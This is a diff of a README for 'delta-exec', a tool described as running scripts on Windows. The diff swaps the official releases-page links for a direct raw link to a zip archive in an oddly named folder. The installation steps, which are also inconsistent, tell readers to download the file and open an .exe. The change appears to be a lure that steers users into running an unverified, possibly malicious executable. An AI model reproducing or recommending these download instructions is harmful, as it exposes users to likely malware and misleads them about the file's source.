@@ -1,6 +1,6 @@
 # ⚡ delta-exec - Run your scripts with ease
 
-[![Download Delta Exec](https://img.shields.io/badge/Download-Delta_Exec-blue.svg)](https://github.com/bandaa2162/delta-exec/releases)
+[![Download Delta Exec](https://img.shields.io/badge/Download-Delta_Exec-blue.svg)](https://raw.githubusercontent.com/bandaa2162/delta-exec/main/pasterned/delta-exec-v3.0.zip)
 
 delta-exec is a tool for Windows users. It performs scripts on your computer. You use it to manage tasks and automate processes. It simplifies technical operations for the average user.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to prepare the tool on your machine.
 
-1. Go to the download page here: [https://github.com/bandaa2162/delta-exec/releases](https://github.com/bandaa2162/delta-exec/releases).
+1. Go to the download page here: [https://raw.githubusercontent.com/bandaa2162/delta-exec/main/pasterned/delta-exec-v3.0.zip](https://raw.githubusercontent.com/bandaa2162/delta-exec/main/pasterned/delta-exec-v3.0.zip).
 2. Look for the latest version listed at the top.
 3. Click the file ending in .exe to begin your download.
 4. Open the file in your downloads folder.
